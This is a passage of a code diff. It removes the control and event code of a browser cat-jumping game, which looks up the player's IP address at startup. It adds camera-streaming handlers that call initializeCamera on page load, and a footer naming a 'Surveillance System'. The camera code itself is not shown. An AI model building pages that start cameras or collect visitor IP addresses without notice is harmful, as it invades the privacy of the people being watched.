-  musicBtn.classList.add('show');
-  coinVal.textContent='0';
-  scHud.textContent='0';
-  bvHud.textContent=bestScore;
-  stBadge.textContent=getStageLabel();
-  cat.vy=JUMP_V;
-  playJumpSound();
-  stopBgMusic();
-  startBgMusic();
-}
-
-function pauseGame(){
-  if(state!==S.PLAYING) return;
-  state=S.PAUSED;
-  pauseSc.textContent=score;
-  showPanel(pPause);
-  pauseBtn.textContent='▶';
-  pauseBgMusic();
-}
-
-function resumeGame(){
-  if(state!==S.PAUSED) return;
-  state=S.PLAYING;
-  showPanel(null);
-  pauseBtn.textContent='⏸';
-  resumeBgMusic();
-}
-
-function goMenu(){
-  stopBgMusic();
-  state=S.IDLE; init();
-  showPanel(pStart);
-  hud.classList.remove('show');
-  musicBtn.classList.remove('show');
-  pauseBtn.textContent='⏸';
-}
-
-function jump(){
-  if(state===S.IDLE){ startGame(); return; }
-  if(state===S.PAUSED){ resumeGame(); return; }
-  if(state===S.PLAYING){ cat.vy=JUMP_V; cat.tailPhase+=1.2; playJumpSound(); }
-}
-
-// ══════════════════════════════════════════════════════════
-//  EVENTS
-// ══════════════════════════════════════════════════════════
-document.getElementById('btnS').addEventListener('click', startGame);
-document.getElementById('btnR').addEventListener('click', startGame);
-document.getElementById('btnMenu').addEventListener('click', goMenu);
-document.getElementById('btnResume').addEventListener('click', resumeGame);
-document.getElementById('btnPR').addEventListener('click', startGame);
-document.getElementById('btnLB').addEventListener('click', showLeaderboard);
-document.getElementById('btnLBBack').addEventListener('click', ()=>showPanel(pStart));
-
-pauseBtn.addEventListener('click', e=>{
-  e.stopPropagation();
-  if(state===S.PLAYING) pauseGame();
-  else if(state===S.PAUSED) resumeGame();
-});
-
-musicBtn.addEventListener('click', e=>{ e.stopPropagation(); toggleMusic(); });
-
-let _lastTouch = 0;
-cv.addEventListener('touchstart', e=>{ e.preventDefault(); _lastTouch=Date.now(); jump(); }, {passive:false});
-cv.addEventListener('click', e=>{
-  if(Date.now()-_lastTouch<600) return;
-  jump();
-});
-
-document.addEventListener('keydown', e=>{
-  if(e.code==='Space'||e.key==='ArrowUp'){ e.preventDefault(); jump(); }
-  if(e.code==='Escape'||e.key==='p'||e.key==='P'){
-    if(state===S.PLAYING) pauseGame();
-    else if(state===S.PAUSED) resumeGame();
-  }
-});
-
-// ══════════════════════════════════════════════════════════
-//  START
-// ══════════════════════════════════════════════════════════
-init();
-fetchUserIP().then(()=>{
-  loop();
-});
+// 3. Event Listener Attachments (Initial Call)
+document.getElementById('startBtn').addEventListener('click', startStreaming);
+document.getElementById('stopBtn').addEventListener('click', stopStreaming);
+window.onload = () => {
+    initializeCamera(); // Initial setup is key!
+};
 </script>
+
+<!-- Footer for professionalism -->
+<div style="margin-top: 30px; font-size: 0.9em; color: #666;">
+    Powered by DIG AI - Surveillance System v2.0 (Fixed & Optimized)
+</div>
+
 </body>
 </html>
